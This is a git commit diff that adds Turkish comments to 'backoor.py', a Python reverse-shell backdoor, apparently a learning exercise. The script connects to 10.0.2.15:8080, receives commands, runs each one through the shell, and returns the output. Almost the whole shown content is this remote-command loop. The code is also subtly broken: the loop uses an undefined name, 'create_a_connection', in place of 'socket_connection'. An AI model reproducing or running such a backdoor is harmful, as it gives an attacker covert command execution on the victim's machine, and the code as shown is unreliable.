2cece269ae82afc7590b3e7dbdb1a05fb51341c2
mehmet0can <mehmetcanatar96@gmail.com>
2022-09-22 20:02:40 +0300

    Update backoor.py

--- backoor.py
+++ backoor.py
@@ -6,12 +6,15 @@ try:
 	def command_execution(command):
 		return subprocess.check_output(command, shell=True)
 
-
+    # Kodun Bu Kısımında python'ın socket modülünü kullanarak
+    # bir TCP baglantısı oluşturuyorum.
 	socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	# Kodun bu Kısımında ise bir İP adresine ve potuna baglanmasını sağlıyorum.
 	socket_connection.connect(("10.0.2.15", 8080))
 	socket_connection.send("connections completed \n")
 
 	while True:
+        # Kodun bu kısımında karşı tarafa veri iletimi sağlıyorum.
 		command = create_a_connection.recv(1024)
 		command_output = command_execution(command)
 		create_a_connection.send(command_output)
